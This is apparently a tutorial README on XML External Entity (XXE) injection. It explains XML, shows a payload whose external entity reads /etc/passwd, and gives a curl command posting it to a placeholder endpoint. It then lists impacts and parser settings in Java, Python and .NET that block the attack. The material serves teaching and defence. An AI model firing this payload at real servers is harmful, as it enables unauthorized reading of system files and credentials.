
# XML External Entity (XXE) Injection ‚Äì Vulnerability and Exploitation

## üìñ What is XML?

**XML (eXtensible Markup Language)** is a markup language used to encode documents in a format that is both human-readable and machine-readable. It is commonly used in data exchange between systems, especially in web services (e.g., SOAP APIs).

A basic XML structure looks like this:

```xml
<?xml version="1.0"?>
<note>
  <to>User</to>
  <from>Server</from>
  <heading>Reminder</heading>
  <body>Hello from XML!</body>
</note>
```

- `<?xml version="1.0"?>` is the XML declaration.
- `<note>` is the root element.
- Elements like `<to>`, `<from>`, etc., are child nodes of the root.
- All elements must be properly closed and nested.

## ‚ö†Ô∏è What is XXE (XML External Entity) Injection?

**XXE (XML External Entity) Injection** is a vulnerability that allows an attacker to interfere with the way an XML parser processes input. If the parser is not securely configured, an attacker can:

- Access internal files (e.g., `/etc/passwd`)
- Access environment variables or config files
- Initiate requests to internal services (SSRF)
- Crash or DoS the server

## üõ†Ô∏è Vulnerable Behavior

When a web server accepts raw XML and does not **disable external entities**, it becomes vulnerable. Consider the server expects this XML:

```xml
<root>
  <ID>1</ID>
</root>
```

An attacker can modify it to:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <ID>&xxe;</ID>
</root>
```

### What‚Äôs happening here?
- A **DOCTYPE declaration** is used to define an external entity `xxe`.
- The value of this entity is set to the contents of `/etc/passwd`.
- When the parser reads `&xxe;`, it inserts the content of the file in its place.

## üß™ Exploitation Proof-of-Concept

1. Save the payload to a file called `xxe.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <ID>&xxe;</ID>
</root>
```

2. Send it with curl to the vulnerable endpoint:

```bash
curl -X POST http://target-site.com/data   -H "Content-Type: application/xml"   --data-binary @xxe.xml
```

If the server is vulnerable, the response will include the contents of `/etc/passwd`.

## üî• Impact

- **Information Disclosure**: Read files like `/etc/passwd`, `.env`, `config.php`
- **Credential Leakage**: Tokens, usernames, passwords, API keys
- **Server-Side Request Forgery (SSRF)**
- **Denial of Service (DoS)**

## üõ°Ô∏è Mitigation & Prevention

### ‚úÖ Safe XML Handling
Always disable external entity processing. Examples:

#### Java (SAX Parser)
```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

#### Python (lxml)
```python
etree.parse(file, parser=etree.XMLParser(resolve_entities=False))
```

#### .NET
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

### ‚úÖ Additional Recommendations
- Avoid using XML when possible (prefer JSON).
- Validate and sanitize all user input.
- Use secure libraries and up-to-date dependencies.

## üìö References
- [OWASP XXE Guide](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)

## ‚úÖ Summary

> XML is powerful but potentially dangerous when external entities are enabled. XXE attacks exploit these configurations to leak data or perform internal actions. Always sanitize and securely parse XML input to prevent this vulnerability.
